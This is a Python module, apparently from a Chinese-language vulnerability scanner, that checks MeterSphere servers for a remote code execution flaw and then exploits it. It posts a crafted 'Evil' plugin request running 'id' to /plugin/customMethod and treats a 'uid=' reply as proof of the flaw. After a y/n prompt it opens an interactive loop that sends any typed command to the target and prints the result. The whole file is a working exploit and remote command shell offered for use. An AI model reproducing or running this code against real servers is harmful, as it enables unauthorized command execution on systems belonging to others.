import requests,urllib3
from pub.com.outprint import OutPrintInfo
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
urllib3.disable_warnings()
class MeterSphereRceScan:

    def run(self,url):
        header = {
            "User-Agent": self.headers,
            "Connection": "close",
            "Content-Length": "40",
            "Content-Type": "application/json",
            "Accept-Encoding": "gzip"
        }
        if not self.batch:
            OutPrintInfo("MeterSphere", "开始检测MeterSphere-Rce漏洞")
        try:
            req_json = {"entry":"Evil","request":"id"}
            req_url = f"{url}/plugin/customMethod"
            response = requests.post(req_url,verify=self.ssl,json=req_json,headers=header,proxies=self.proxys)
            if "uid=" in response.text:
                OutPrintInfo("MeterSphere",f"存在MeterSphere-Rce漏洞 {req_url}")
                if self.batch:
                    with open("./result/metersphere_rce.txt","a") as w:
                        w.write(f"{req_url}\n")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("MeterSphere", "不存在MeterSphere-Rce漏洞")
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("MeterSphere", "目标访问错误")
            return False


    def run2(self, url,cmd):
        header = {
            "User-Agent": self.headers,
            "Connection": "close",
            "Content-Length": "40",
            "Content-Type": "application/json",
            "Accept-Encoding": "gzip"
        }
        OutPrintInfo("MeterSphere", "开始利用MeterSphere-Rce漏洞")
        try:
            req_json = {"entry": "Evil", "request": cmd}
            req_url = f"{url}/plugin/customMethod"
            response = requests.post(req_url, verify=self.ssl, json=req_json, headers=header, proxies=self.proxys)

            OutPrintInfo("MeterSphere", "执行结果如下")
            print(response.text)
        except Exception:
            OutPrintInfo("MeterSphere", "目标访问错误")

    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.headers = target["header"]
        proxy = target["proxy"]
        self.ssl = target["ssl"]
        _, self.proxys = ReqSet(proxy=proxy, bwork=self.batch)
        flag = self.run(url)
        if not self.batch:
            if flag:
                choose = Prompt.ask("[b cyan]是否进行漏洞利用([b bright_red]y/n[/b bright_red])")
                if choose == "y":
                    while True:
                        cmd = Prompt.ask("[b cyan]输入需要执行的命令")
                        if cmd != "exit":
                            self.run2(url,cmd)
                        else:
                            break

        if not self.batch:
            OutPrintInfo("MeterSphere", "漏洞检测结束")
